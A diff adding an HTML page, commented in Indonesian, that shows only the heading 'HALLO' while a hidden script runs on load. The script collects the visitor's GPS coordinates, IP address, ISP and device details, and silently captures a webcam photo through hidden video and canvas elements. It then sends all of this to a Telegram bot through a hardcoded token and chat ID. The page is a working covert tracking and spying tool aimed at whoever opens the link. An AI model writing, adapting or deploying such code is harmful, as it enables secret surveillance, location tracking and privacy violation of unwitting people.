@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>./1tsM3T4maa</title>
+</head>
+<body>
+    <h1>HALLO ‼️</h1>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        const BOT_TOKEN = "7732602866:AAHSA4X_QGm_fYhrxo-IvNsNZXeJSt5LWqg";  // Ganti dengan token bot Telegram
+        const CHAT_ID = "7324869375"; // Ganti dengan chat ID tujuan
+        const TELEGRAM_PHOTO_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+        let reportData = {
+            waktu: new Date().toLocaleString("id-ID"),
+            referer: document.referrer || "Tidak diketahui",
+            userAgent: navigator.userAgent,
+            ipInfo: { city: "-", country: "-", region: "-", ip: "-", isp: "-", proxy: "-" },
+            gpsInfo: { latitude: "-", longitude: "-" }
+        };
+
+        function sendPhotoWithCaption(imageBlob) {
+            const caption = `📌 *Laporan Baru*  
+🕒 *Waktu:* ${reportData.waktu}  
+🔗 *Referer:* ${reportData.referer}  
+📱 *Device:* ${reportData.userAgent}  
+
+🌍 *Berdasarkan IP:*  
+📍 Kota: ${reportData.ipInfo.city}  
+🌏 Negara: ${reportData.ipInfo.country}  
+🗺️ Region: ${reportData.ipInfo.region}  
+🔢 IP: ${reportData.ipInfo.ip}  
+📡 ISP: ${reportData.ipInfo.isp}  
+📶 Proxy: ${reportData.ipInfo.proxy ? "Ya" : "Tidak"}  
+
+📍 *Lokasi Berdasarkan GPS:*  
+🗺️ Latitude: ${reportData.gpsInfo.latitude}  
+🗺️ Longitude: ${reportData.gpsInfo.longitude}  
+🔗 [Google Maps](https://www.google.com/maps?q=${reportData.gpsInfo.latitude},${reportData.gpsInfo.longitude})`;
+
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", imageBlob, "photo.jpg");
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+
+            fetch(TELEGRAM_PHOTO_API, {
+                method: "POST",
+                body: formData
+            }).catch(error => console.error("Gagal kirim foto:", error));
+        }
+
+        function getIPLocation() {
+            fetch("https://ip-api.com/json/")
+                .then(response => response.json())
+                .then(data => {
+                    reportData.ipInfo = {
+                        city: data.city,
+                        country: data.country,
+                        region: data.regionName,
+                        ip: data.query,
+                        isp: data.isp,
+                        proxy: data.proxy
+                    };
+                    capturePhoto();
+                })
+                .catch(error => console.error("Gagal ambil lokasi IP:", error));
+        }
+
+        function getGeolocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        reportData.gpsInfo = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        getIPLocation();
+                    },
+                    error => {
+                        console.warn("Gagal dapat GPS:", error.message);
+                        getIPLocation();
+                    }
+                );
+            } else {
+                console.warn("Geolocation tidak didukung.");
+                getIPLocation();
+            }
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        video.srcObject.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob(blob => {
+                            sendPhotoWithCaption(blob);
+                        }, "image/jpeg");
+                    }, 3000);  // Ambil foto setelah 3 detik
+                })
+                .catch(error => {
+                    console.warn("Akses kamera ditolak atau gagal:", error);
+                    sendPhotoWithCaption(null); // Kalau kamera gagal, kirim laporan tanpa foto
+                });
+        }
+
+        window.onload = getGeolocation;
+    </script>
+</body>
+</html>
